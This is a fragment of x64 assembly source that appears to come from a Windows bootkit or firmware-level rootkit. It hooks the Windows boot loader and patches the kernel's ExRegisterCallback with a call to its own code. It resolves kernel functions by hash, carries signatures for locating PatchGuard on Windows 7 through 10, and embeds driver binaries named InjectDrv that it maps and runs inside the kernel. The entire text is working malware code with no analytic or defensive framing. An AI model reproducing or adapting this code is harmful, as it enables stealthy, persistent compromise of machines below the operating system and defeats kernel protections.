jnz Hook_ExRegisterCallBack
mov r8,[rbp + x64_ExAllocatePool]
mov [rbp + x64_ExRegisterCallback],r8
Hook_ExRegisterCallBack:
mov r9,[r8]
mov [rbp + Fixed_Hooked_ExRegisterCallBack_Start],r9
mov edi,[rdx + 0xB0]
add rdi,rsi
lea rsi,[rbp + x64_Hook_ExRegisterCallback_Start]
mov ecx,x64_Hook_ExRegisterCallback_End - x64_Hook_ExRegisterCallback_Start
rep movsb
sub rdi,x64_Hook_ExRegisterCallback_End - x64_Hook_ExRegisterCallback_Start
mov byte [r8],0xE8
sub rdi,r8
sub rdi,0x05
mov [r8 + 1],edi
pop rsi
pop rdi
pop rbp
pop rax
pop rcx
pop r13
popf
cmp r15,0x01
jnz X64_Hook_Winload_Return
jmp rax
X64_Hook_Winload_Return:
retfq
X64_Hook_Winload_End:

Fixed_X64_Hook_Winload_Start:
db 0x00
dd 0x00000000
Fixed_X64_Hook_Winload_End:
x64_Serach_Ntoskrnl_Export_Start:
mov rsi,rax
mov ecx,dword [rsi + 0x3C]
add rcx,rsi
mov edx,dword [rcx + 0x88]
add rdx,rsi
push rcx
mov ecx,dword [rdx + 0x20]
add rcx,rsi
mov r14d,dword [rdx + 0x1C]
add r14,rsi
mov edi,dword [rdx + 0x18]
mov ebp,dword [rdx + 0x24]
add rbp,rsi
xor r8,r8
x64_Serach_Api_Name_Hash:
mov edx,dword [rcx]
add rdx,rsi
mov bx,[rbp + r8 * 0x02 + 0x00]
and ebx,0xFFFF
mov eax,[r14 + rbx * 0x04]
add rax,rsi
call x64_Check_Hash_Value_Start
add rcx,0x04
inc r8
dec edi
jnz x64_Serach_Api_Name_Hash
pop rdx
retn
x64_Serach_Ntoskrnl_Export_End:

x64_Set_Section_Characteristics_Start:
push rbp
movsxd rbp,dword [rsi + 0x3C]
xor edi,edi
movzx ecx,word [rsi + rbp + 0x06]
test ecx,ecx
jle x64_Set_Section_Characteristics_Return
cmp edi,ecx
lea rbx,[rsi + rbp + 0x12C]
jge x64_Set_Section_Characteristics_Next
x64_Set_Section_Characteristics_Set:
and dword [rbx],0xFDFFFFFF
or dword [rbx],0xA8000000
x64_Set_Section_Characteristics_Next:
movzx ecx,word [rsi + rbp + 0x06]
inc edi
add rbx,0x28
cmp edi,ecx
jl x64_Set_Section_Characteristics_Set
x64_Set_Section_Characteristics_Return:
pop rbp
retn
x64_Set_Section_Characteristics_End:

x64_Check_Hash_Value_Start:
call x64_Calc_Hash_Value_Start
call x64_Check_Hash_Value_CurEip
x64_Check_Hash_Value_CurEip:
	X64_BASE_OFFSET_Check_Hash_Value equ (x64_Check_Hash_Value_CurEip - ROM_START)
pop r10
sub r10,X64_BASE_OFFSET_Check_Hash_Value
lea r11,[r10 + x64_KERNEL_API_HASH_VALUE]
lea r13,[r10 + x64_KERNEL_API_SAVE_ADDRESS]
mov r12,0xfffffffffffffffc
x64_Check_Hash_Value_Cmp:
add r12,0x04
cmp dword [r11 + r12],0x00000000
jz x64_Check_Hash_Value_Return
cmp dword [r11 + r12],r9d
jnz x64_Check_Hash_Value_Cmp
mov [r13 + r12 * 0x02 + 0x00],rax
x64_Check_Hash_Value_Return:
retn
x64_Check_Hash_Value_End:

x64_Calc_Hash_Value_Start:
xor r9d,r9d
xor r10d,r10d
inc r9d
xor r11d,r11d
x64_Hash_Value_Calc:
mov r11b,[rdx]
test r11b,r11b
jz x64_Calc_Hash_Value_Return
add r9d,r11d
add r10d,r9d
inc rdx
jmp x64_Hash_Value_Calc
x64_Calc_Hash_Value_Return:
shl r10d,0x10
or r9d,r10d
retn
x64_Calc_Hash_Value_End:

x64_Hook_ExRegisterCallback_Start:

call x64_Hook_ExRegisterCallback_CurEip
x64_Hook_ExRegisterCallback_CurEip:
	X64_BASE_OFFSET_HOOK_ExRegisterCallback equ (x64_Hook_ExRegisterCallback_CurEip - x64_Hook_ExRegisterCallback_Start)
pop rbp
sub rbp,X64_BASE_OFFSET_HOOK_ExRegisterCallback
cld
cmp byte [rbp + x64_IsCallExRegisterCallBack_Flag - x64_Hook_ExRegisterCallback_Start],0x01
jnz x64_Hook_ExRegisterCallback_Run
pop r10
mov rax,rsp
mov [rax + 0x08],rbx
mov r10,[rbp + x64_ExRegisterCallback - x64_Hook_ExRegisterCallback_Start]
add r10,0x07
jmp r10
retn
x64_Hook_ExRegisterCallback_Run:
push rbx
push rbp
push rdi
push rsi
push r12
push r13
push r14
push r15
push rcx
mov rdi,[rbp + x64_ExRegisterCallback - x64_Hook_ExRegisterCallback_Start]
mov rcx,[rbp + Fixed_Hooked_ExRegisterCallBack_Start - x64_Hook_ExRegisterCallback_Start]
cmp ecx,0x48C48B48
jz x64_Hook_ExRegisterCallback_NoHooked
mov [rdi],rcx
jmp x64_Hook_ExRegisterCallback_Do_It
x64_Hook_ExRegisterCallback_NoHooked:
mov byte [rbp + x64_IsCallExRegisterCallBack_Flag - x64_Hook_ExRegisterCallback_Start],0x01
x64_Hook_ExRegisterCallback_Do_It:
pop rcx
sub rsp,0x70
call [rbp + x64_ExRegisterCallback - x64_Hook_ExRegisterCallback_Start]
add rsp,0x70
push rcx
push rax
sub rsp,0x70
mov qword r8,0
mov qword rdx,x64_Map_Dat_End - x64_Map_Dat_Start
mov rcx,[rbp + x64_FuckDrvAddress - x64_Hook_ExRegisterCallback_Start]
call [rbp + x64_MmMapIoSpace - x64_Hook_ExRegisterCallback_Start]
add rsp,0x70
test rax,rax
jz x64_Hook_ExRegisterCallback_Return
xor rcx,rcx
x64_Hook_ExRegisterCallback_Search_FuckDrv_Entry:
inc rcx
cmp rcx,x64_Map_Dat_End - x64_Map_Dat_Start
jnb x64_Hook_ExRegisterCallback_Return
cmp dword [rax + rcx],0x40404040
jnz x64_Hook_ExRegisterCallback_Search_FuckDrv_Entry
sub rsp,0x70
lea rdi,[rax + rcx + 0x04]
mov rcx,[rbp + x64_ExAllocatePoolWithTag - x64_Hook_ExRegisterCallback_Start]
mov rdx,rax
call rdi
add rsp,0x70
x64_Hook_ExRegisterCallback_Return:
pop rax
pop rcx
pop r15
pop r14
pop r13
pop r12
pop rsi
pop rdi
pop rbp
pop rbx
add rsp,0x08
retn
x64_Hook_ExRegisterCallback_Save:
x64_IsCallExRegisterCallBack_Flag db 0x00
x64_FuckDrvAddress dq 0x0000000000000000
x64_Ntoskrnl_Base_Address dq 0x0000000000000000
;========================================================================================================
x64_KERNEL_API_SAVE_ADDRESS:

x64_PsSetLoadImageNotifyRoutine dq 0x0000000000000000
x64_KeUpdateSystemTime dq 0x0000000000000000
x64_ExAllocatePoolWithTag dq 0x0000000000000000
x64_ExRegisterCallback dq 0x0000000000000000
x64_ExAllocatePool dq 0x0000000000000000
x64_MmMapIoSpace dq 0x0000000000000000
x64_KdDebuggerEnabled dq 0x0000000000000000
;x64_ExFreePoolWithTag dq 0x0000000000000000
;x64_PsGetCurrentThreadProcessId dq 0x0000000000000000
Fixed_Hooked_ExRegisterCallBack_Start:
dq 0x0000000000000000
Fixed_Hooked_ExRegisterCallBack_End:

x64_Hook_ExRegisterCallback_End:

x64_KERNEL_API_HASH_VALUE:

dd 0x91E40AB2		;PsSetLoadImageNotifyRoutine
dd 0x42A50728		;KeUpdateSystemTime
dd 0x594D0835		;ExAllocatePoolWithTag
dd 0x42790710		;ExRegisterCallback
dd 0x2802057D		;ExAllocatePool
dd 0x1C88047D		;MmMapIoSpace
dd 0x392A0680		;KdDebuggerEnabled
dd 0x00000000		;End
;=================================================================================================================================
SERACH_SIGNATURE:
dd 0E5FFDB31h
dd 0
dd 100000EAh
dd 90001000h
dd 001000EAh
dd 89001000h
dd 0F2F095FFh
dd 046AFFFFh
dd 66206A66h
dd 66cb6653h
dd 0FF0C75FFh
dd 0C25D0855h
dd 50D08E66h
dd 0
dd 0E819BB68h
dd 0
dd 0FAB085C7h
dd 4FFFFh
;dd 0x196A006A
;dd 0x00000000
;dd 0xABF3C033
;dd 0x0FD8200F
dd 0
SaveOrigal_1 dd 0
SEARCH_PATCHGUARD_START:
;Windows 7 x64
dd 0x58EC8148
dd 0x3300000F
;Windows 8 x64
dd 0x92048d48
dd 0x000002ba
;Windows 8.1 x64
dd 0x00000000
dd 0x00000000
;Windows 10 x64
dd 0x00000000
dd 0x00000000
;End
dd 0x00000000
SEARCH_PATCHGUARD_END:
;================================================================================================================================
x86_Map_Dat_Start:
incbin './InjectDrvx86.sys'
x86_Map_Dat_End:

x64_Map_Dat_Start:
incbin './InjectDrvx64.sys'
x64_Map_Dat_End:
;================================================================================================================================
;%ifdef BOOT_BIOS
;	TIMES (THE_MODULE_SIZE - ($ - $$) - 2) db 0
;	dw 0xaa55
;%endif
%ifdef BOOT_BIOS
	times (THE_MODULE_SIZE - ($ - $$) - 1) db 0
%endif
MODULE_CKSUM db 0
CRC_OFFSET equ (MODULE_CKSUM - MoveCode)